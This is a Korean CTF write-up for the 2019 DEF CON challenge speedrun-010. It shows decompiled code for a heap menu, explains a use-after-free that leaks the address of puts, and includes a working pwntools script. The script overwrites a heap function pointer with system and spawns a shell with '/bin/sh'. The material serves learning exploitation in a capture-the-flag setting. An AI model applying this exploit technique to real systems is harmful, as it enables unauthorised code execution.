---
title: "2019 Defcon CTF speedrun-010"
date: 2020-1-13
tags: [Defcon]
categories: [Defcon]
---

보호기법은 다 걸려있는 64비트 바이너리다.

```
[*] '/vagrant/ctfs/speedrun-010'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

name과 msg는 5개까지 만들 수 있다. 1,2번 메뉴는 할당해주고 뭐 등등 하고 3,4번 메뉴는 각각 free해준다.

```c
unsigned __int64 sub_8BC()
{
  __int64 v0; // rsi
  char buf; // [rsp+7h] [rbp-29h]
  int v3; // [rsp+8h] [rbp-28h]
  int v4; // [rsp+Ch] [rbp-24h]
  ssize_t v5; // [rsp+10h] [rbp-20h]
  char *v6; // [rsp+18h] [rbp-18h]
  char *v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v3 = 0;
  v4 = 0;
  while ( 1 )
  {
    sub_89D();
    v5 = read(0, &buf, 1uLL);
    if ( v5 != 1 )
      break;
    switch ( buf )
    {
      case 49:
        if ( v4 > 5 )
          return __readfsqword(0x28u) ^ v8;
        ++v4;
        puts("Need a name");
        v7 = (char *)malloc(0x30uLL);
        read(0, v7 + 8, 0x17uLL);
        v7[31] = 0;
        *((_QWORD *)v7 + 4) = &puts;
        qword_202080[v4 - 1] = v7;
        break;
      case 50:
        if ( v3 > 5 )
          return __readfsqword(0x28u) ^ v8;
        ++v3;
        puts("Need a message");
        v6 = (char *)malloc(0x30uLL);
        v0 = (__int64)(v6 + 16);
        read(0, v6 + 16, 0x18uLL);
        v6[40] = 0;
        (*((void (__fastcall **)(signed __int64, __int64))qword_202080[v4 - 1] + 4))(
          (signed __int64)qword_202080[v4 - 1] + 8,
          v0);
        *((_QWORD *)v6 + 1) = &puts;
        (*((void (__fastcall **)(const char *))v6 + 1))(" says ");
        (*((void (__fastcall **)(char *))v6 + 1))(v6 + 16);
        (*((void (__fastcall **)(const char *))v6 + 1))("\n");
        *(_QWORD *)v6 = qword_202080[v4 - 1];
        qword_202040[v3 - 1] = v6;
        break;
      case 51:
        if ( !v4 )
          return __readfsqword(0x28u) ^ v8;
        free(qword_202080[v4 - 1]);
        break;
      default:
        if ( buf != 52 || !v3 )
          return __readfsqword(0x28u) ^ v8;
        free(qword_202040[v3-- - 1]);
        break;
    }
  }
  return __readfsqword(0x28u) ^ v8;
}
```

UAF가 터진다. name이랑 msg를 0x30만큼 똑같은 크기를 자유롭게 할당하고 해제할 수 있다.

함수 포인터로 puts가 저장되서 heap영역에 puts의 주소가 저장되어있다. 그래서 leak이 가능하다. 

puts 위치에 system을 쓰고 인자에는 /bin/sh\x00 넣어서 쉘을 띄워주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)

def name(name):
	sa('5\n','1')
	sa('name',name)

def msg(msg):
	sa('5\n','2')
	sa('message',msg)

def free_name():
	sa('5\n','3')

def free_msg():
	sa('5\n','4')

if __name__ == '__main__':
	e = ELF('./speedrun-010')
	p = process('./speedrun-010')
	libc = e.libc

	name('A')
	free_name()
	msg('B')
	msg('C')
	libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.symbols['puts']
	log.info('libc_base : ' + hex(libc_base))
	
	name('/bin/sh\x00')
	free_name()
	msg(p64(libc_base + libc.symbols['system'])*3)
	#raw_input()
	p.interactive()
```

